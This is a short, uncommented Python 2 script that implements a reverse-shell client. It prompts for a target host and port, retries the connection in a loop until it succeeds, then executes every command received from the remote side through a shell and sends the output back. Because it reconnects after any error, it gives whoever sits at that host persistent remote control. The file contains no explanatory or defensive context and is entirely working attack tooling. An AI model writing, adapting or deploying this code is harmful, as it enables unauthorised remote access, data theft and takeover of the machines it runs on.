#!/usr/bin/python

import socket
import threading
import subprocess
import sys
import os

target_host = raw_input("set target host: ")
target_port = int(raw_input("set target port: ")) 


def run_command(command):
	output = ''
	command = command.rstrip()
        #command = command + "; exit 0"
	output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	for line in iter(output.stdout.readline, ''):
		#line = line.replace('\n', '').replace('\r', '')
		#print line
		client.send(line)
		sys.stdout.flush()

def quit_connection():
	client.close()
	os._exit(1)

while 1:
	
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	while 1:
		
		try:
			
			client.connect((target_host, target_port))
			#print "[*] Connected"
			break;

		except:
			pass

	while True:
		
		try:	
			
			cmd_buffer = ""
			cmd_buffer=client.recv(1024)
						
			if (cmd_buffer == "quit" or cmd_buffer == "exit" or cmd_buffer == "close"):
				quit_connection()
			
			elif ("cd" in cmd_buffer):
				cmd_buffer = cmd_buffer.replace("cd ", "" )
				os.chdir(cmd_buffer)
				client.send(os.getcwd())
				
			else:			
				
				run_command(cmd_buffer)
				client.send("#")	
		except:
			client.close()
			break
